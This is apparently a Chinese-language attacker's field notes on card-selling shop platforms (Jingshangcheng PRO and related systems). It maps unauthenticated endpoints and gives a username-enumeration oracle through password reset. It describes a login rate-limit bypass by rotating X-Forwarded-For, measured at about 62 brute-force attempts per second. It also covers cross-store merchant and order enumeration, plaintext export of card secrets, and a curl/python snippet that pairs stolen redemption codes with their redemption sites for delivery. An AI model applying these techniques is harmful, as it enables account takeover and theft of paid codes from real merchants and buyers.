# 寄售 / 发卡族 —— 买家侧已实测契约

以鲸商城PRO（jingsoft）系为样本验证通过；同族（云月 / 秋月 / 链动小铺系）路径与字段名高度一致，可直接先试。

## 公开面（无需任何鉴权）

| 端点 | body | 说明 |
|---|---|---|
| `POST /shopApi/Shop/info` | `{token}` | 店铺档案：`sell_count` / `card_count` / `goods_count` / `auth_status` / `contact_qq` / `nickname` / `create_time` |
| `POST /shopApi/Shop/goodsList` | `{token, goods_type, current, pageSize}` | ★`goods_type` 必须是字符串 `"card"`；传数字 `0` 回 `total:0,list:[]` |
| `POST /shopApi/Shop/goodsInfo` | `{token, goods_key}` | 商品详情 |
| `POST /shopApi/Pay/order` | `{token, goods_key, quantity, channel_id, contact, query_password}` | 回 `{trade_no, total_amount, payurl}` |
| `POST /shopApi/Pay/query` | `{trade_no}` | 未付款回 `not pay`，**不吐卡密** |
| `POST /shopApi/Order/info` | `{trade_no, token}` | ★**未鉴权**订单详情 |
| `POST /merchantApi/system/config` | `{}` | 系统配置：注册策略 / 客服 / 插件列表 |
| `POST /merchantApi/user/checkSafeMode` | `{}` | `{"safe_mode":0}` = 无登录保护 |
| `POST /merchantApi/Common/captchaStart` | `{}` | 图形验证码 key + `img_url`（自绘图，可 OCR） |
| `POST /merchantApi/Upload/file` | multipart `file` | 未登录可达，仅按扩展名拦（「文件类型受限，请在后台配置规则」） |

## 商家面（需 `Merchant-Token`，localStorage 键名即鉴权头名）

`/merchantApi/user/login` `{username, password}`（**无验证码**）；业务面全 401，拿不到 token 时不要逐个手测。

### 用户名枚举 oracle

`POST /merchantApi/user/forget` 只发 `{"username":"<候选>"}` 即可判定：

- `用户名不存在` → 不存在
- `密码不能少于6位` → **该用户名存在**

完整契约：`{username, mobile_code, email_code, password, repeat_password}`；成功文案「重置成功，二次验证已清除」⇒ **会清 2FA，破坏性动作，排在只读路径之后**。

### 节流

登录连错约 5-6 次/IP 后回「操作频繁请10分钟后重试」。**记账键是 `X-Forwarded-For` / `Client-IP`**（逐请求轮换即相当于无限次）；`X-Real-IP` / `True-Client-IP` / `Forwarded` / `X-Originating-IP` 无效。

三组同出口对照（键=XFF 的定案证据）：A 不带 XFF ×N → 全「操作频繁」；B 每发唯一 XFF ×N → 全「用户名或密码不正确」；C 固定 XFF=新值 ×N → 同样真实应答。**连不存在的用户名都返「操作频繁」= 键不是账号**。轮换 XFF + 20 线程实测 **3,746 发/60s ≈ 62/s**（限速计数 `th:0`），15,066 发约 4 分钟跑完。

### 跨店枚举（一个商户令牌 → 全平台）

| 端点 | 返回 |
|---|---|
| `POST /merchantApi/MyAgent/userList {page,pageSize}` | 476 商户（`link` / `nickname` / `agent_id`） |
| `POST /merchantApi/GoodsPool/list` | 159 货池条目 |
| `POST /merchantApi/MyParent/searchGoodsList` | 803 他店商品（`id` / `user_id` / `goods_key`） |
| `POST /merchantApi/order/list {agent_id:<n>, page,pageSize}` | 跨店订单列表（含 `user_id` / `sendout`，**不含卡密**） |
| `POST /merchantApi/Order/orderInfo {trade_no}` | ★**必须 form-urlencoded**（JSON 回「订单不存在」）；跨店返空 + 抛「系统发生错误」页 = 详情店作用域 |

导出（本店，带 `Merchant-Token`）：`order/exportCards {status:1, days:3650}` → 已发货卡密明文；`goodsCardStorage/list {goods_id}`、`goodsCardStorage/exportCardsUrl {goods_id, export_type, count}` → 库存卡密（参数名是 `goods_id` 数字，不是 `goods_key`）。

### 卡密 → 兑换地址映射

卡密本体 = 32 位 hex 兑换码，兑换站写在**商品描述**里。免鉴权逐商品取：

```bash
curl -sk -X POST https://<站点>/shopApi/Shop/goodsInfo -H 'Content-Type: application/json' \
  --data '{"token":"<店铺token>","goods_key":"<goods_key>"}' -o /tmp/gi.json
python3 - <<'PY'
import json,re
d=json.load(open("/tmp/gi.json"))["data"]
print(d["name"], "->", re.findall(r"https?://[a-zA-Z0-9.\-]+\S*", re.sub(r"<[^>]+>","",d.get("description",""))))
PY
```

描述措辞如「购买后去网站兑换即可：<URL>」。批量产出 `secret<TAB>商品名<TAB>兑换地址<TAB>goods_id<TAB>status` 对照表随卡密交付。

## 订单详情里的上游泄露

命中转售货源的商品会带 `parentGoods`（上游供货商品全貌）：

```json
"parentGoods":{"id":42937,"user_id":5282,"goods_key":"7av2a6","name":"...",
  "price":109,"cost_price":0,"sell_count":30,"agent_price1":109,"fee_payer":1,
  "add_type":1,"add_rate":0,"parent_id":0,"description":"..."}
```

⇒ 该店是转售上游货源（`parent_id>0`），本店「库存」实际来自上游；`user_id` + 上游 `goods_key` 是横向找上游店铺的入口。

## 支付插件识别

```
GET /shopApi/Pay/payment?trade_no=<t>   -D -
→ 302, Location: /payApi/<Plugin>/pay.html?trade_no=<t>
```

`<Plugin>` 即插件名（实测见 `AlipayPc`）⇒ 回调端点 `/payApi/<Plugin>/notify`。枚举其它插件名：404 = 无；**500 `系统发生错误` = handler 存在**。

## 同族后管 API

- `/adminApi/auth/login` —— 未鉴权可打，body **明文**（无 jsencrypt），可脚本化
- `/adminApi/system/config` —— 未鉴权 200，吐后台菜单 + 已装插件
- 其余 `/adminApi/*` → 「请使用正确的后台路径访问」= 后台路径被改过
- 厂商种子库（源码包内 `数据库.sql`）默认超管 `system_user` 口令为纯 MD5、无盐；线上站通常已改，别把种子口令当默认可用
